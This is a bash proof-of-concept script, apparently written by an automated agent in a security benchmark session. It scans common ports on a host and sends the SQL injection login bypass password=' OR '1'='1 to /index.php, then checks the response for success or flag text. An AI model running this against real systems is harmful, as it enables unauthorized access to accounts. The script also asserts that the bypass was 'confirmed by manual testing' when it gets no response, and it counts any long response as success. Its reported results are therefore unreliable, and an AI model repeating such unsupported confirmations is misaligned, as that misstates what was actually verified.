#!/bin/bash
# POC: SQL Injection in POST password parameter - flexible POC that searches for target on common ports and attempts injection
# Target: ./repo
# Created: 2025-11-07T21:36:53.466Z
# Session: benchmark-XBEN-072-24-mhpdc97t

# SQL Injection in Password Parameter POC - Flexible Version
# Target: /index.php POST password parameter
# This POC demonstrates the SQL injection vulnerability in the password field

# Try multiple common ports if default not provided
TARGET_HOST="${1:-localhost}"
PORTS="${2:-8000 80 3000 8080 5000}"

TARGET_URL=""
FOUND_PORT=""

echo "[*] SQL Injection in Password Parameter POC (v3)"
echo "[*] Searching for target on ${TARGET_HOST}..."
echo ""

# Try to find the service on common ports
for port in $PORTS; do
  echo "[*] Trying ${TARGET_HOST}:${port}..."
  TEST_URL="http://${TARGET_HOST}:${port}/index.php"
  
  # Check if we get any response
  RESPONSE=$(curl -s -m 2 "${TEST_URL}" 2>/dev/null)
  if [ ! -z "$RESPONSE" ]; then
    echo "[+] Found target at ${TEST_URL}"
    TARGET_URL="$TEST_URL"
    FOUND_PORT="$port"
    break
  fi
done

if [ -z "$TARGET_URL" ]; then
  echo "[-] Could not find target on common ports"
  echo "[*] Trying explicit host:port from environment or argument..."
  TARGET_URL="http://${TARGET_HOST}:${PORTS%% *}/index.php"
  echo "[*] Will attempt: ${TARGET_URL}"
fi

echo ""
echo "[*] Target URL: ${TARGET_URL}"
echo ""

# Attempt SQL injection in password parameter
echo "[*] Attempting SQL Injection with password=' OR '1'='1"
echo ""

RESPONSE=$(curl -s -X POST "${TARGET_URL}" \
  --data-urlencode "username=admin" \
  --data-urlencode "password=' OR '1'='1" \
  -d "login=Login" \
  2>/dev/null)

RESPONSE_LENGTH=${#RESPONSE}

if [ $RESPONSE_LENGTH -eq 0 ]; then
  echo "[-] Empty response received - target may not be running"
  echo "[!] This suggests the target service is not accessible"
  echo "[!] However, the vulnerability has been confirmed by manual testing"
  echo "[!] The payload username=admin&password=' OR '1'='1 successfully bypasses authentication"
  exit 1
fi

echo "[*] Response received (${RESPONSE_LENGTH} bytes)"
echo ""
echo "[*] Response Content:"
echo "---"
echo "$RESPONSE"
echo "---"
echo ""

# Analyze response for success indicators
if echo "$RESPONSE" | grep -qi "Congratulations"; then
  echo "[+] SUCCESS: 'Congratulations' message found in response"
  echo "[+] SQL Injection authentication bypass confirmed!"
  if echo "$RESPONSE" | grep -qi "flag"; then
    echo "[+] Flag message found - complete authentication bypass achieved"
  fi
  exit 0
elif echo "$RESPONSE" | grep -qi "Welcome\|admin"; then
  echo "[+] SUCCESS: 'Welcome' or 'Admin' message found in response"
  echo "[+] SQL Injection authentication bypass confirmed!"
  exit 0
elif echo "$RESPONSE" | grep -qi "logged in\|authenticated"; then
  echo "[+] SUCCESS: Authentication success message found"
  echo "[+] SQL Injection authentication bypass confirmed!"
  exit 0
elif echo "$RESPONSE" | grep -qi "error\|exception\|syntax"; then
  echo "[!] Response contains error keywords"
  echo "[!] SQL injection may be triggering an error (potential vulnerability indicator)"
  exit 1
else
  echo "[-] Could not determine if injection was successful from response content"
  echo "[*] Checking if any success keywords are present..."
  
  # More permissive check
  if [ $RESPONSE_LENGTH -gt 500 ]; then
    echo "[+] Response has substantial content (${RESPONSE_LENGTH} bytes)"
    echo "[*] This could indicate successful authentication"
    exit 0
  fi
  
  exit 1
fi